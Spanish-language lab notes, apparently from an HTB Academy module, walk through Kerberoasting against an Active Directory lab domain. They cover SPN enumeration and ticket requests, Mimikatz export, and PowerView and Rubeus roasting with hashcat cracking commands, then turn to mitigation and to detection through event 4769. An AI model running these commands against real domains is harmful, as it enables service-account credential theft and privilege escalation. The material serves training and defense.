
## 1. Concepto

El **Kerberoasting** consiste en solicitar tickets de servicio **TGS (Ticket Granting Service)** para cuentas de Active Directory que tienen configurado un **SPN (Service Principal Name)** y extraer material que permita intentar recuperar sus contraseñas mediante cracking offline.

El ataque se basa en:

1. Enumerar las cuentas que tienen SPN.
    
2. Solicitar tickets TGS para las cuentas seleccionadas.
    
3. Extraer los tickets o sus hashes.
    
4. Crackear los hashes con Hashcat.
    
5. Comprobar si las credenciales obtenidas permiten acceder a otros recursos o escalar privilegios.
    

**Importante:** no es necesario tener privilegios de administrador de dominio para solicitar tickets TGS. El riesgo depende, entre otros factores, de la contraseña de la cuenta de servicio y de los privilegios que tenga.

# 2. Método manual con herramientas integradas de Windows

## 2.1. Enumerar SPN con `setspn.exe`

Podemos consultar los SPN registrados en el dominio:

```
setspn.exe -Q */*
```

Para especificar el dominio:

```
setspn.exe -T INLANEFREIGHT.LOCAL -Q */*
```

Ejemplo de salida:

```
CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
    backupjob/veam001.inlanefreight.local

CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
    MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
```

Debemos prestar especial atención a las **cuentas de usuario con SPN**, ya que pueden ser objetivos de Kerberoasting. La consulta también devuelve SPN pertenecientes a cuentas de equipo.

En este laboratorio, algunos objetivos son:

|Cuenta|SPN|
|---|---|
|`backupagent`|`backupjob/veam001.inlanefreight.local`|
|`sqlprod`|`MSSQLSvc/SPSJDB.inlanefreight.local:1433`|
|`sqlqa`|`MSSQLSvc/SQL-CL01-01inlanefreight.local:49351`|
|`sqldev`|`MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433`|
|`adfs`|`adfsconnect/azure01.inlanefreight.local`|

## 2.2. Solicitar un TGS con PowerShell

Podemos utilizar clases de .NET para solicitar un ticket TGS para un SPN concreto.

Primero, cargamos el ensamblado necesario:

```
Add-Type -AssemblyName System.IdentityModel
```

Después, solicitamos un ticket para el SPN de SQL Server:

```
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

La salida contiene información como:

```
Id                   : uuid-...
ValidFrom            : ...
ValidTo              : ...
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
```

### ¿Qué hace cada comando?

- `Add-Type`: permite cargar tipos de .NET en la sesión de PowerShell.
    
- `-AssemblyName System.IdentityModel`: especifica el ensamblado que contiene las clases necesarias.
    
- `New-Object`: crea una instancia de un objeto .NET.
    
- `KerberosRequestorSecurityToken`: solicita un ticket Kerberos para el SPN indicado, utilizando la sesión de inicio de sesión actual.
    

El ticket queda disponible en la memoria de la sesión y puede extraerse posteriormente.

## 2.3. Solicitar tickets para todos los SPN

También podemos combinar `setspn.exe` con PowerShell para solicitar tickets para los SPN encontrados:

```
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

Este comando:

1. Consulta los SPN del dominio.
    
2. Filtra las líneas que comienzan por `CN`.
    
3. Recupera la línea siguiente a cada coincidencia.
    
4. Crea un objeto `KerberosRequestorSecurityToken` para solicitar el ticket correspondiente.
    

**Limitación:** al solicitar tickets de todos los SPN, también podemos incluir cuentas de equipo y otros servicios que no sean objetivos interesantes.

# 3. Extraer tickets con Mimikatz

Una vez solicitados los tickets, podemos utilizar Mimikatz para extraerlos de la memoria.

## 3.1. Exportar los tickets

Dentro de Mimikatz:

```
privilege::debug
base64 /out:true
kerberos::list /export
```

`base64 /out:true` permite obtener la representación Base64 de los tickets exportados.

El comando:

```
kerberos::list /export
```

enumera los tickets Kerberos disponibles y exporta los tickets correspondientes a archivos `.kirbi`.

La salida permite identificar información como:

```
Server Name : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL
Client Name : htb-student @ INLANEFREIGHT.LOCAL
```

El archivo exportado puede tener un nombre parecido a:

```
2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
```

Si exportamos directamente los archivos `.kirbi`, podemos transferirlos al equipo de ataque y trabajar con ellos sin tener que reconstruirlos a partir de Base64.

## 3.2. Convertir Base64 a `.kirbi`

Si hemos copiado el ticket como Base64, primero debemos eliminar los saltos de línea:

```
echo "<BASE64_DEL_TICKET>" | tr -d '\n'
```

Guardamos el contenido Base64 completo en un archivo y lo decodificamos:

```
cat encoded_file | base64 -d > sqldev.kirbi
```

Ahora tenemos un archivo `.kirbi` que podemos procesar.

## 3.3. Extraer el hash con `kirbi2john.py`

El módulo utiliza una versión de `kirbi2john.py` compatible con Python 2.7:

```
python2.7 kirbi2john.py sqldev.kirbi
```

Esto genera un archivo llamado `crack_file`.

El formato generado debe adaptarse al que espera Hashcat.

## 3.4. Adaptar el hash para Hashcat

Ejecutamos:

```
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

Comprobamos el resultado:

```
cat sqldev_tgs_hashcat
```

El hash resultante tiene un formato parecido a:

```
$krb5tgs$23$*sqldev.kirbi*$...
```

El modo `13100` de Hashcat corresponde a tickets Kerberos 5 TGS-REP cifrados con RC4, es decir, `etype 23`.

> El procedimiento de conversión anterior es específico del formato que produce la versión de `kirbi2john.py` utilizada en el módulo. Si tu herramienta genera un formato diferente, comprueba el formato del hash antes de aplicar la transformación.

## 3.5. Crackear el hash

Ejecutamos Hashcat con la lista `rockyou.txt`:

```
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

En el laboratorio, la contraseña recuperada para `sqldev` es:

```
database!
```

La contraseña obtenida es un ejemplo del laboratorio, no un resultado garantizado en otros entornos.

# 4. Método automatizado con PowerView

PowerView permite enumerar las cuentas con SPN y obtener los hashes en un formato que Hashcat puede utilizar directamente.

## 4.1. Enumerar cuentas con SPN

Importamos PowerView:

```
Import-Module .\PowerView.ps1
```

Enumeramos las cuentas que tienen SPN:

```
Get-DomainUser * -spn | Select-Object samaccountname
```

Ejemplo de salida:

```
samaccountname
--------------
adfs
backupagent
krbtgt
sqldev
sqlprod
sqlqa
solarwindsmonitor
```

Debemos comprobar qué cuentas son realmente objetivos válidos. La enumeración por SPN no significa que todas las cuentas devueltas sean objetivos igualmente interesantes.

## 4.2. Obtener el hash de una cuenta concreta

Para solicitar y formatear el ticket de `sqldev`:

```
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

La salida contiene información como:

- `SamAccountName`: nombre de la cuenta.
    
- `DistinguishedName`: ubicación de la cuenta en Active Directory.
    
- `ServicePrincipalName`: SPN asociado.
    
- `Hash`: hash preparado para Hashcat.
    

En este caso, no necesitamos realizar manualmente la extracción del ticket con Mimikatz ni la conversión mediante `kirbi2john.py`.

## 4.3. Exportar todos los hashes a CSV

Podemos obtener los hashes de todas las cuentas con SPN y guardar la información en un archivo CSV:

```
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

Consultar el archivo:

```
Get-Content .\ilfreight_tgs.csv
```

El CSV incluye columnas como:

```
SamAccountName
DistinguishedName
ServicePrincipalName
TicketByteHexStream
Hash
```

**Ventaja:** podemos recopilar los datos desde Windows y procesar los hashes offline desde el equipo de ataque.

# 5. Método automatizado con Rubeus

Rubeus es una herramienta de GhostPack que automatiza diferentes operaciones relacionadas con Kerberos, incluido el Kerberoasting.

## 5.1. Enumerar estadísticas con `/stats`

```
.\Rubeus.exe kerberoast /stats
```

Esta opción recopila estadísticas sobre las cuentas susceptibles de Kerberoasting sin solicitar los tickets TGS.

La salida puede mostrar:

- Número total de cuentas con SPN susceptibles de Kerberoasting.
    
- Tipos de cifrado compatibles.
    
- Año en el que se estableció por última vez la contraseña.
    

En el ejemplo del módulo:

```
Total kerberoastable users : 9
```

De esas nueve cuentas, siete admiten RC4 y dos admiten AES.

Las cuentas con contraseñas muy antiguas pueden ser objetivos interesantes, ya que podrían conservar contraseñas débiles. No obstante, la antigüedad de la contraseña es solamente un indicador para priorizar la investigación, no una prueba de que sea vulnerable.

## 5.2. Obtener hashes de cuentas privilegiadas

El módulo utiliza el atributo `admincount=1` como filtro para centrarse en cuentas que pueden ser de interés administrativo:

```
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

El filtro reduce el conjunto de cuentas consultadas. Sin embargo, `**admincount=1**` **no demuestra por sí solo que una cuenta tenga privilegios efectivos actualmente**: hay que comprobar sus grupos y permisos.

El parámetro `/nowrap` evita que los hashes se dividan en varias líneas, facilitando su copia y procesamiento.

Ejemplo de cuentas encontradas en el laboratorio:

```
backupagent
```

Rubeus muestra el nombre de la cuenta, su SPN, la fecha de modificación de la contraseña, los tipos de cifrado admitidos y el hash.

## 5.3. Guardar los hashes en un archivo

Para guardar la salida de Kerberoasting:

```
.\Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
```

También podemos solicitar un usuario concreto:

```
.\Rubeus.exe kerberoast /user:sqldev /nowrap
```

Para seleccionar un SPN concreto:

```
.\Rubeus.exe kerberoast /spn:"MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433" /nowrap
```

Estas opciones dependen de la versión de Rubeus y de los parámetros compatibles con la operación elegida.

## 5.4. Opciones importantes de Rubeus

|Opción|Función|
|---|---|
|`/stats`|Enumera estadísticas sin solicitar tickets.|
|`/user:USUARIO`|Selecciona una cuenta concreta.|
|`/spn:"SPN"`|Selecciona un SPN concreto.|
|`/outfile:hashes.txt`|Guarda los hashes en un archivo.|
|`/nowrap`|Evita el ajuste de línea de los hashes.|
|`/creduser` y `/credpassword`|Permiten especificar credenciales alternativas.|
|`/ticket`|Permite utilizar un TGT existente, según la operación.|
|`/ldapfilter`|Aplica un filtro LDAP personalizado.|
|`/resultlimit`|Limita el número de resultados cuando se utiliza con las opciones correspondientes.|
|`/delay` y `/jitter`|Introducen pausas y variación temporal entre solicitudes.|
|`/aes`|Solicita Kerberoasting con hashes AES.|
|`/usetgtdeleg`|Utiliza el mecanismo de delegación del TGT para solicitar tickets.|
|`/rc4opsec`|Ejecuta una variante que filtra determinadas cuentas con AES habilitado.|

Para consultar las opciones disponibles en tu versión:

```
.\Rubeus.exe
```

# 6. Tipos de cifrado y Hashcat

El tipo de cifrado empleado para proteger el ticket influye en la velocidad del cracking offline.

## 6.1. RC4 — etype 23

Un hash RC4 suele comenzar así:

```
$krb5tgs$23$*
```

En Hashcat se utiliza:

```
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

RC4 es considerablemente más rápido de crackear que AES en los ejemplos del módulo, por lo que las cuentas con SPN que utilizan este cifrado pueden ser objetivos prioritarios.

## 6.2. AES128 — etype 17

AES128 es otro tipo de cifrado que puede aparecer en tickets TGS.

El texto del módulo se centra principalmente en RC4 y AES256, por lo que no desarrolla un procedimiento completo de cracking para AES128.

## 6.3. AES256 — etype 18

Un hash AES256 puede comenzar así:

```
$krb5tgs$18$
```

El modo de Hashcat utilizado en el módulo es:

```
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```

En el ejemplo, el cracking de una contraseña relativamente sencilla tardó aproximadamente 4 minutos y 36 segundos en una CPU.

Los tiempos dependen del hardware, del hash, de la contraseña y de la lista de candidatos utilizada.

### Comparación

|Característica|RC4|AES256|
|---|---|---|
|Tipo de cifrado Kerberos|Etype 23|Etype 18|
|Prefijo habitual del hash|`$krb5tgs$23$`|`$krb5tgs$18$`|
|Modo Hashcat del módulo|`13100`|`19700`|
|Cracking offline|Generalmente más rápido|Generalmente más lento|
|¿Impide Kerberoasting?|No|No|

**Idea clave:** habilitar AES puede aumentar el coste del cracking, pero no elimina el riesgo de Kerberoasting. Una contraseña débil puede seguir siendo recuperable.

# 7. Consultar los tipos de cifrado con PowerView

Podemos consultar los atributos relevantes de una cuenta:

```
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

El atributo `msDS-SupportedEncryptionTypes` ayuda a identificar los tipos de cifrado configurados.

En los ejemplos del módulo:

|Valor decimal|Interpretación del ejemplo|
|---|---|
|`0`|No se especifica un tipo concreto; se utiliza el comportamiento predeterminado, que en el ejemplo es RC4.|
|`24`|AES128 y AES256.|

No debe interpretarse el valor de este atributo de forma aislada: el cifrado que finalmente se negocia también depende de la configuración de la cuenta, del cliente y del controlador de dominio.

## 7.1. Ejemplo con RC4

```
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

El hash obtenido comienza por:

```
$krb5tgs$23$
```

En el ejemplo del módulo, Hashcat recupera la contraseña:

```
welcome1
```

## 7.2. Ejemplo con AES256

Si la cuenta admite AES128/AES256, Rubeus puede devolver un hash como:

```
$krb5tgs$18$
```

El procedimiento de cracking del ejemplo es:

```
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```

Aunque AES aumenta el coste del cracking, una contraseña débil sigue siendo vulnerable a ataques offline.

# 8. Solicitud de RC4 con `/tgtdeleg`

Rubeus dispone de la opción:

```
.\Rubeus.exe kerberoast /usetgtdeleg /nowrap
```

El módulo también presenta el uso de `/tgtdeleg` para intentar obtener tickets RC4 cuando la configuración del entorno lo permite.

**Limitación importante:** según el módulo, esta técnica de degradación de AES a RC4 no funciona contra controladores de dominio Windows Server 2019 en el escenario descrito. En esos entornos se devuelve el cifrado más fuerte admitido por la cuenta objetivo.

Por tanto, no debemos asumir que podemos forzar RC4 en todos los dominios. El resultado depende de la versión y configuración del entorno.

# 9. Mitigación del Kerberoasting

## 9.1. Utilizar contraseñas robustas

Las cuentas de servicio deben tener contraseñas largas, complejas y que no aparezcan en diccionarios comunes.

Una contraseña débil permite que un atacante intente recuperar su valor mediante cracking offline sin necesidad de seguir interactuando con el controlador de dominio.

## 9.2. Utilizar cuentas de servicio administradas

Se recomienda utilizar, cuando sea posible:

- **MSA:** Managed Service Accounts.
    
- **gMSA:** Group Managed Service Accounts.
    

Estas cuentas permiten gestionar contraseñas complejas y su rotación automática, reduciendo la dependencia de contraseñas estáticas administradas manualmente.

## 9.3. Revisar las cuentas privilegiadas con SPN

Conviene evitar que cuentas administrativas privilegiadas se utilicen como cuentas de servicio con SPN, salvo que exista una necesidad justificada y se hayan aplicado los controles apropiados.

## 9.4. Restringir RC4 con cuidado

Limitar el uso de RC4 puede dificultar el cracking de tickets, pero los cambios en los tipos de cifrado deben probarse antes de implantarse.

Eliminar tipos de cifrado sin evaluar la compatibilidad puede provocar problemas de autenticación en el entorno.

**Habilitar AES no elimina por sí solo el Kerberoasting.** La gestión segura de las cuentas y sus contraseñas sigue siendo fundamental.

# 10. Detección del Kerberoasting

El Kerberoasting puede generar un volumen anormal de solicitudes de tickets de servicio Kerberos.

Una señal de alerta es observar un gran número de solicitudes TGS procedentes de una misma cuenta en un intervalo corto de tiempo, especialmente si los servicios solicitados no coinciden con su comportamiento habitual.

## 10.1. Eventos de Windows

Los eventos destacados por el módulo son:

|ID de evento|Significado|
|---|---|
|`4769`|Se solicitó un ticket de servicio Kerberos.|
|`4770`|Se renovó un ticket de servicio Kerberos.|

El evento `4769` es especialmente relevante para investigar solicitudes de tickets TGS.

En el módulo se indica que entre 10 y 20 solicitudes para una cuenta pueden ser normales en determinados entornos. No es un umbral universal: debe establecerse una línea base del comportamiento normal de cada organización.

## 10.2. Habilitar la auditoría

La auditoría de operaciones de tickets de servicio Kerberos puede configurarse mediante la directiva de grupo.

El módulo señala esta ruta:

```
Configuración del equipo
└── Directivas
    └── Configuración de Windows
        └── Configuración de seguridad
            └── Directivas locales
                └── Opciones de seguridad
```

Es importante revisar la política de auditoría aplicable y confirmar que los eventos se registran en los controladores de dominio.

## 10.3. Qué investigar en el evento 4769

Al analizar una solicitud, conviene revisar:

- La cuenta que solicita el ticket.
    
- La cuenta o servicio de destino.
    
- La frecuencia y el volumen de solicitudes.
    
- El tipo de cifrado del ticket.
    
- Si la actividad corresponde al patrón habitual de esa cuenta.
    

Un número anormal de solicitudes, combinado con el uso de RC4 y otros indicadores, puede ser señal de Kerberoasting. Ninguno de estos indicadores, por sí solo, confirma el ataque.

# 11. Flujo de trabajo recomendado para el laboratorio

## Desde Windows

### Paso 1. Enumerar los SPN

```
setspn.exe -Q */*
```

### Paso 2. Enumerar las cuentas con PowerView

```
Get-DomainUser * -spn | Select-Object samaccountname
```

### Paso 3. Obtener hashes con Rubeus

```
.\Rubeus.exe kerberoast /nowrap
```

Para consultar estadísticas antes de solicitar tickets:

```
.\Rubeus.exe kerberoast /stats
```

### Paso 4. Guardar los hashes

```
.\Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
```

### Paso 5. Identificar el tipo de cifrado

- `$krb5tgs$23$` → RC4.
    
- `$krb5tgs$18$` → AES256.
    

### Paso 6. Crackear offline desde Linux

Para RC4:

```
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

Para AES256:

```
hashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt
```

Comprueba que el archivo contiene hashes válidos y compatibles con el modo seleccionado.

### Paso 7. Validar el acceso

Si recuperamos una contraseña, debemos comprobar de forma autorizada qué acceso proporciona y qué privilegios tiene la cuenta.

En el laboratorio, una cuenta de servicio comprometida podría permitir:

- Acceso por RDP o WinRM, si tiene los permisos necesarios.
    
- Acceso a recursos compartidos.
    
- Autenticación en un servidor MSSQL.
    
- Escalada de privilegios, si la cuenta dispone de permisos suficientes.
    

**Recuperar una contraseña no implica automáticamente obtener privilegios de administrador de dominio.** Es necesario enumerar los permisos y las relaciones de confianza de la cuenta.
